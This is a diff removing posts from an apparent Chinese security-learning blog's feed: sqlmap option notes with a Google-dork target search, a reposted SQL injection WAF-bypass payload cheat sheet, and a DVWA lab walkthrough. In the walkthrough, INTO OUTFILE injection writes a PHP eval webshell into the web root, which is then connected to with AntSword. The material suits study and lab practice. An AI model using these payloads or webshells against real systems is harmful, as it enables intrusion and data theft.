-<pre><code>http://test.dvwa.com/vulnerabilities/sqli/?id=1&amp;Submit=Submit#
-http://test.dvwa.com/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#
-</code></pre>
-<p>-r：通过http请求文件进行扫描</p>
-<pre><code>sqlmap -r lalala.txt
-</code></pre>
-<p>示例文件，lalala.txt</p>
-<pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9
-Cache-Control: no-cache
-Connection: keep-alive
-Cookie: security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795
-Host: 127.0.0.1
-Pragma: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
-</code></pre>
-<p>--random-agent：随机user-agent</p>
-<p>--proxy：指定代理</p>
-<p>--threads：指定http(s)最大请求数 (默认 1)</p>
-<p>-v：查看sqlmap的运行信息，一般使用3即可，具体如下</p>
-<blockquote>
-<p>共有七个等级，默认为1：</p>
-<p>0、只显示python错误以及严重的信息。</p>
-<p>1、同时显示基本信息和警告信息。（默认）</p>
-<p>2、同时显示debug信息。</p>
-<p>3、同时显示注入的payload。</p>
-<p>4、同时显示HTTP请求。</p>
-<p>5、同时显示HTTP响应头。</p>
-<p>6、同时显示HTTP响应页面。</p>
-</blockquote>
-<p>-g：从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
-<pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;
-</code></pre>
-<p>谷歌搜索技巧</p>
-<p>1、“xxx”<br>
-解释：搜素结果必须包含xxx关键字</p>
-<p>2、雪*白<br>
-解释：这里的*就是一个占位符，保证前面是雪，后面是白</p>
-<p>3、xxx inurl: baidu<br>
-解释：就是说xxx必须出现在网址的url中</p>
-<p>4、xxx insite:某网站域名<br>
-解释：指定某个网站中，搜索相关结果</p>
-<p>5、xxx &amp;gl=us,cn<br>
-解释：指定xxx结果的国家来源，us美国，cn中国</p>
-<p>-f：执行广泛的DBMS版本指纹检查</p>
-<p>--data：将数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
-<p>例子：</p>
-<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f
-</code></pre>
-<p>--is-dba：判断当前的用户是否为管理，是的话会返回True。</p>
-<p>--batch：用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
-<p>--crawl：sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
-<p>--eta：可以计算注入数据的剩余时间。</p>
-<p>参考文章：</p>
-<p>https://www.cnblogs.com/hongfei/p/3872156.html</p>
-<p>https://www.cnblogs.com/dagger9527/tag/Sqlmap/</p>
-<p>https://www.freebuf.com/sectool/164608.html</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sql注入绕过姿势总结（转载）]]></title>
-        <id>https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/</id>
-        <link href="https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
-        </link>
-        <updated>2021-04-17T09:38:36.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="sql注入绕过姿势总结转载">sql注入绕过姿势总结（转载）</h1>
-<p>作者：<a href="https://www.cnblogs.com/joker-vip/">joker0xxx3</a></p>
-<p>出处：https://www.cnblogs.com/joker-vip/</p>
-<h2 id="1注释符绕过">1.注释符绕过</h2>
-<p>常用的注释符有：</p>
-<p>1）-- 注释内容</p>
-<p>2）# 注释内容</p>
-<p>3）/<em>注释内容</em>/</p>
-<p>eg：union select 1,2#</p>
-<p>union select 1,2 --+</p>
-<p>构造闭合 ’ union select 1,2’</p>
-<hr>
-<h2 id="2大小写绕过">2.大小写绕过</h2>
-<p>常用于 waf的正则对大小写不敏感的情况。</p>
-<p>eg：uniOn selEct 1,2</p>
-<hr>
-<h2 id="3内联注释绕过">3.内联注释绕过</h2>
-<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!...</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*... */搞混了。</p>
-<p>eg：union /<em>!select</em>/ 1,2</p>
-<hr>
-<h2 id="4双写关键字绕过">4.双写关键字绕过</h2>
-<p>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。</p>
-<p>eg：union seselectlect 1,2</p>
-<hr>
-<h2 id="5特殊编码绕过">5.特殊编码绕过</h2>
-<p>1）十六进制绕过</p>
-<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
-<p>2）ascii编码绕过</p>
-<p>eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<p>3）Unicode编码</p>
-<p>常用的几个符号的一些Unicode编码：</p>
-<p>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
-<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
-<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
-<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
-<hr>
-<h2 id="6空格过滤绕过">6.空格过滤绕过</h2>
-<p>可代替空格的方式：</p>
-<p>1）/**/</p>
-<p>2）()</p>
-<p>3）回车(url编码中的%0a)</p>
-<p>4）`(tap键上面的按钮)</p>
-<p>5）tap</p>
-<p>6）两个空格</p>
-<p>eg：union/<strong>/select/</strong>/1,2</p>
-<p>select(passwd)from(users)  #注意括号中不能含有*</p>
-<p>select<code>passwd</code>from<code>users</code></p>
-<hr>
-<h2 id="7过滤or-and-xor异或not-绕过">7.过滤or and xor(异或)not 绕过</h2>
-<p>and = &amp;&amp;</p>
-<p>or = ||</p>
-<p>xor = |</p>
-<p>not = !</p>
-<hr>
-<h2 id="8过滤等号绕过">8.过滤等号=绕过</h2>
-<p>1）不加通配符的like执行的效果和=一致，所以可以用来绕过。</p>
-<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like &quot;users&quot;</p>
-<p>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样</p>
-<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike &quot;users&quot;</p>
-<p>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
-<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp &quot;users&quot;</p>
-<p>4）使用大小于号来绕过</p>
-<p>eg：select * from users where id &gt; 1 and id &lt; 3</p>
-<p>5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了</p>
-<p>eg：select * from users where !(id &lt;&gt; 1)</p>
-<hr>
-<h2 id="9过滤大小于号绕过">9.过滤大小于号绕过</h2>
-<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</p>
-<p>1）greatest(n1, n2, n3…):返回n中的最大值</p>
-<p>eg：select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</p>
-<p>2）least(n1,n2,n3…):返回n中的最小值，与上同理。</p>
-<p>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
-<p>eg：select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)</p>
-<p>4）in关键字</p>
-<p>eg：select * from users where id = 1 and substr(username,1,1) in ('t')</p>
-<p>5）between a and b:范围在a-b之间，包括a、b。</p>
-<p>eg：select * from users where id between 1 and 2</p>
-<p>select * from users where id between 1 and 1</p>
-<hr>
-<h2 id="10过滤引号绕过">10.过滤引号绕过</h2>
-<p>1）使用十六进制</p>
-<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
-<p>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 '(单引号)，单引号会被转义成'</p>
-<p>eg：%E6' union select 1,2 #</p>
-<p>%df%27 union select 1,2,3 #</p>
-<hr>
-<h2 id="11过滤逗号绕过">11.过滤逗号绕过</h2>
-<p>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串<br>
-eg：常规写法 select substr(&quot;string&quot;,1,3)</p>
-<p>若过滤了逗号，可以使用from pos for len来取代 select substr(&quot;string&quot; from 1 for 3)</p>
-<p>sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110</p>
-<p>2）也可使用join关键字来绕过</p>
-<p>eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c</p>
-<p>上式等价于 union select 1,2,3</p>
-<p>3）使用like关键字，适用于substr()等提取子串的函数中的逗号</p>
-<p>eg：select user() like &quot;t%&quot;</p>
-<p>上式等价于 select ascii(substr(user(),1,1))=114</p>
-<p>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2</p>
-<p>eg：select * from users limit 1 offset 2</p>
-<p>上式等价于 select * from users limit 2,1</p>
-<hr>
-<h2 id="12过滤函数绕过">12.过滤函数绕过</h2>
-<p>1）sleep() --&gt;benchmark()</p>
-<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
-<p>eg：select 1,2 and benchmark(1000000000,1)</p>
-<p>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</p>
-<p>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符</p>
-<p>eg：mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;)</p>
-<p>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
-<p>5）user() --&gt; @@user、datadir–&gt;@@datadir</p>
-<p>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p>
-<hr>
-<h2 id="13缓冲区溢出">13.缓冲区溢出</h2>
-<p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
-<p>eg：?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
-<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
-<hr>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[MySQL手注之Root权限处理]]></title>
-        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/</id>
-        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/">
-        </link>
-        <updated>2021-04-16T13:54:30.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="mysql手注之root权限处理">MySQL手注之Root权限处理</h1>
-<p>学前疑问：</p>
-<ul>
-<li>注入的目的是啥？
-<ul>
-<li>得到数据库中的数据？</li>
-<li>得到目标的控制权限？</li>
-</ul>
-</li>
-</ul>
-<h2 id="原理">原理</h2>
-<p>利用写入函数写入一句话木马、后续shell连接的代码等（大概~</p>
-<h2 id="提权条件">提权条件</h2>
-<ul>
-<li>
-<p>当前操作数据库的用户为root权限（不一定需要root权限，但一定要有<strong>文件写入的权限</strong>，不然会白忙活</p>
-</li>
-<li>
-<p>能够得到到物理地址（报错、phpinfo页⾯、猜、爆破），后续的写入地址需要用到</p>
-</li>
-<li>
-<p>能够判断数据库的版本，从而决使用什么注入函数</p>
-<ul>
-<li>
-<p>5.5.53前，my.ini中<strong>secure_file_priv</strong> 变量默认为空，所以默认情况下是<strong>可以直接通过SQL语句来导出</strong>⽂件的。</p>
-</li>
-<li>
-<p>5.5后，mysql推出secure_file_priv变量，用于控制文件的写入导出</p>
-<ul>
-<li>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</li>
-<li>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</li>
-<li>当secure_file_priv设置为空 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="常用到的函数">常用到的函数</h2>
-<h3 id="load_file">load_file()</h3>
-<p>读取文件</p>
-<pre><code>select load_file('/etc/passwd'); 
-
-select load_file(0x2F6574632F706173737764);
-</code></pre>
-<h3 id="outfile和dumpfile">outfile()和dumpfile()</h3>
-<p>写入文件</p>
-<h4 id="into-outfile">into outfile()</h4>
-<p>into outfile()写入时会在每行结束时<strong>⾃动加上换⾏符</strong></p>
-<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into outfile '/var/www/html/muma.php' ;
-</code></pre>
-<h4 id="into-dumpfile">into dumpfile()</h4>
-<p>into dumpfile()函数写入<strong>原⽣内容</strong>，常用于写入<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661?fr=aladdin">⼆进制⽂件</a></p>
-<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into DUMPFILE '/var/www/html/muma.php' ;
-</code></pre>
-<p>以下仅限配合dumpfile()使用（未验证）</p>
-<pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; lines starting by 'xxxx' 
-</code></pre>
-<ul>
-<li>
-<p>lines starting by '写⼊的内容' 设置<strong>每⾏数据开头</strong>的字符，可以为单个或多个字符，默认情况下不使⽤任何字符</p>
-</li>
-<li>
-<p>lines terminated by '写⼊的内容' 设置<strong>每⾏数据结尾</strong>的字符，可以为单个或多个字符，默认值是&quot;\n&quot;。</p>
-</li>
-</ul>
-<p>所以说into outfile()就是into dumpfile()的简约版本？嘿嘿~</p>
-<h2 id="实践">实践</h2>
-<p>目标：dvwa</p>
-<p>难度：low</p>
-<h3 id="查看数据库版本">查看数据库版本</h3>
-<pre><code>select @@version;
-</code></pre>
-<pre><code>5.7.26
-</code></pre>
-<h3 id="查看secure_file_priv">查看secure_file_priv</h3>
-<p>可以知道当前数据库版本是在5.5.53后的，存在secure_file_priv，查看当前设置</p>
-<pre><code>show global variables like '%secure%';
-</code></pre>
-<pre><code>Variable_name				Value
-require_secure_transport	OFF
-secure_auth					ON
-secure_file_priv			NULL
-</code></pre>
-<p>当前为NULL，即不可以随意导出写入</p>
-<h3 id="写入payload">写入payload</h3>
-<p>写入payload试试</p>
-<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'#
-</code></pre>
-<p>提示</p>
-<pre><code>File 'C:phpStudy_64phpstudy_proWWWDVWAmuma.php' already exists
-</code></pre>
-<p>windows下需要加转义符号</p>
-<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
-</code></pre>
-<p>实际运行的代码为</p>
-<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'# ';
-</code></pre>
-<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
-</code></pre>
-<p>被拒绝了，难道是secure_file_priv设置为NULL的原因吗？</p>
-<p>将my.ini文件中设置secure_file_priv为空试试</p>
-<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170602.png" alt="QQ截图20210417170602" loading="lazy"></figure>
-<pre><code>show global variables like '%secure%';
-</code></pre>
-<pre><code>Variable_name				Value
-require_secure_transport	OFF
-secure_auth					ON
-secure_file_priv			
-</code></pre>
-<p>重新载入payload</p>
-<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
-</code></pre>
-<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
-</code></pre>
-<p>好家伙，继续被拒绝</p>
-<p>查阅资料后发现，当前根本没有写入权限……</p>
-<p>查看权限的命令</p>
-<pre><code>select * from mysql.user where user='dvwa';
-</code></pre>
-<p>发现根本没有文件读写的权限</p>
-<p>所以说，一定要在写入前注意当前用户<strong>是否具有写入权限</strong></p>
-<p>解决方法</p>
-<p>将当前用户切换为root用户或者赋予当前用户相应的权限</p>
-<p>继续执行刚刚的payload</p>
-<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
-</code></pre>
-<p>页面出现了报警信息</p>
-<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165647.png" alt="QQ截图20210417165647" loading="lazy"></figure>
-<p>问题不大，查看文件，发现已经写入到本地了</p>
-<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165756.png" alt="QQ截图20210417165756" loading="lazy"></figure>
-<p>文件内容如下</p>
-<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165818.png" alt="QQ截图20210417165818" loading="lazy"></figure>
-<h3 id="使用蚁剑连接">使用蚁剑连接</h3>
-<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165939.png" alt="QQ截图20210417165939" loading="lazy"></figure>
-<p>发现返回数据为空，大概是写入的东西不太对，换个paylad</p>
-<pre><code>1' into outfile 'C:\\phpStudy_64\\phpstudy_pro\\WWW\\DVWA\\muma.php' lines starting by '&lt;?php @eval($_POST[pass])?&gt;'#
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170121-1618651389179.png" alt="QQ截图20210417170121" loading="lazy"></figure>
-<p>重新连接</p>
-<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170133.png" alt="QQ截图20210417170133" loading="lazy"></figure>
-<p>成功</p>
-<h2 id="总结">总结</h2>
-<ul>
-<li>
-<p>在进行写入文件前一定要确认当前用户是否拥有写入文件权限</p>
-</li>
-<li>
-<p>确认当前secure_file_priv为空或者为某一确定的路径</p>
-</li>
-<li>
-<p>注入的内容用<strong>双引号</strong>括起来</p>
-</li>
-<li>
-<p>注入的内容需要以<?php evel($_POST[pass]);?>等连接代码开头</p>
-</li>
-</ul>
-<h2 id="附录">附录</h2>
-<h3 id="magic_quote_gpc">magic_quote_gpc</h3>
-<p>魔术引号~会对输入的特殊符号进行转义</p>
-<p>参考资料</p>
-<p>https://blog.csdn.net/niexinming/article/details/49109683</p>
-<p>https://www.jb51.net/article/29462.htm</p>
 ]]></content>
     </entry>
 </feed>
